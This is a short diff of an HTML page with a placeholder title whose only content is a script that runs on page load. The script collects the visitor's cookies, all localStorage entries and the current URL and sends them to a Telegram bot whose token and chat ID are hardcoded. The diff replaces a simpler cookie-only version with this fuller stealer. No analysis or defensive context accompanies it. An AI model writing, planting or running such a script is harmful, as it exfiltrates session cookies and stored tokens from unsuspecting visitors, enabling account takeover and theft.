@@ -1,11 +1,27 @@
-<!-- index.html -->
+<!DOCTYPE html>
+<html>
+<head><title>...</title></head>
+<body>
 <script>
-fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-        chat_id: chatId,
-        text: document.cookie
-    })
-});
+(async () => {
+    const botToken = '8075761114:AAH-1OlKoUwEZbnpl-pDj0S-GL66gGVrlH0';
+    const chatId = '7355153180';
+    
+    const exfil = {
+        cookies: document.cookie,
+        storage: Object.keys(localStorage).map(k => `${k}=${localStorage.getItem(k)}`).join('; '),
+        url: location.href
+    };
+    
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: JSON.stringify(exfil, null, 2)
+        })
+    });
+})();
 </script>
+</body>
+</html>
